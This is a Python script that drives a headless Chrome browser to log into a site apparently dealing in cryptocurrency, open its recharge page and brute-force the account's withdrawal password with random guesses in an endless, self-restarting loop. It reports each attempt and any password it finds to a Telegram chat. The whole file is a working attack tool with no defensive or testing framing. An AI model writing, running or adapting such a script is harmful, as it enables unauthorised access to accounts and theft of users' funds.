import os
import time
import random
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import telebot
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
USERNAME = os.getenv('BTC658_USERNAME')
PASSWORD = os.getenv('BTC658_PASSWORD')

# Telegram bot setup
bot = telebot.TeleBot(BOT_TOKEN)

def send_update(message):
    bot.send_message(CHAT_ID, message)

def generate_password():
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    length = random.randint(4, 10)
    return ''.join(random.choice(chars) for _ in range(length))

def main():
    send_update("🚀 Bot Started")
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    driver = webdriver.Chrome(options=chrome_options)
    try:
        # Login
        driver.get("https://btc658.com/pages/user/other/userLogin")
        driver.find_element("name", "username").send_keys(USERNAME)
        driver.find_element("name", "password").send_keys(PASSWORD)
        driver.find_element("css selector", "button[type='submit']").click()
        send_update("✅ Login Successful")
        
        # Navigate to recharge page
        driver.get("https://btc658.com/pages/user/recharge/userRecharge")
        send_update("📂 Reached Recharge Page")
        
        # Brute force loop
        while True:
            pwd = generate_password()
            send_update(f"🔑 Trying password: {pwd}")
            pwd_field = driver.find_element("name", "withdrawalPassword")
            pwd_field.clear()
            pwd_field.send_keys(pwd)
            driver.find_element("css selector", "button[type='submit']").click()
            time.sleep(5)
            # Check for error
            if "incorrect" in driver.page_source.lower():
                send_update("❌ Wrong password")
            else:
                send_update(f"🎉 Correct password found: {pwd}")
                break

    except Exception as e:
        send_update(f"⚠️ Bot Crashed: {e}")
        driver.quit()
        time.sleep(5)
        main()
    finally:
        driver.quit()

if __name__ == "__main__":
    main()
